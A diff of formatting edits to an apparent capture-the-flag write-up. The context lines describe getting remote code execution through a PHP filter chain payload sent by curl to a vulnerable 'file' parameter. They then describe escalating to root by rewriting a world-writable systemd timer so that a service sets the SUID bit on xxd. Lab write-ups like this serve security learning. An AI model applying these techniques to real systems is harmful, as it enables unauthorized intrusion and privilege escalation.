@@ -147,7 +147,7 @@ python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'
 ```
 <img width="1897" height="583" alt="filter-chain-generator-id" src="https://github.com/user-attachments/assets/23f690ab-dbc1-4ccd-a8cf-f56fa987ed25" />
 
-The tool returned a long `php://filter/...` payload. I then used that payload in a request to the vulnerable endpoint through the file parameter.
+The tool returned a long `php://filter/...` payload. I then used that payload in a request to the vulnerable endpoint through the `file` parameter.
 
 ```bash
 payload='php://filter/...'
@@ -158,9 +158,9 @@ curl -G --output - 'http://10.x.x.x/secret-script.php' \
 <img width="1908" height="390" alt="rce-id-output" src="https://github.com/user-attachments/assets/e2e0a306-4a56-4beb-8844-397d90271977" />
 
 The response returned the result of the `id` command:
-
-`uid=33(www-data) gid=33(www-data) groups=33(www-data)`
-
+```text
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
 This confirmed that I had achieved remote code execution on the target as the `www-data` user.
 
 
@@ -329,14 +329,14 @@ The service file showed the following command:
 
 This meant that if the service ran successfully as root, it would copy xxd to `/opt/xxd` and set the SUID bit on it.
 
-However, the timer was broken because `OnBootSec=` was empty. I checked the permissions of the unit files and found that exploit.timer was world-writable.
+However, the timer was broken because `OnBootSec=` was empty. I checked the permissions of the unit files and found that `exploit.timer` was world-writable.
 
 ```bash
 ls -l /etc/systemd/system/exploit.timer /etc/systemd/system/exploit.service
 ```
 <img width="833" height="51" alt="exploit-timer-permissions" src="https://github.com/user-attachments/assets/ed6d3207-19b3-472d-ad97-0d4082284b95" />
 
-I modified exploit.timer to include a valid timer configuration:
+I modified `exploit.timer` to include a valid timer configuration:
 
 ```bash
 cat > /etc/systemd/system/exploit.timer << 'EOF'
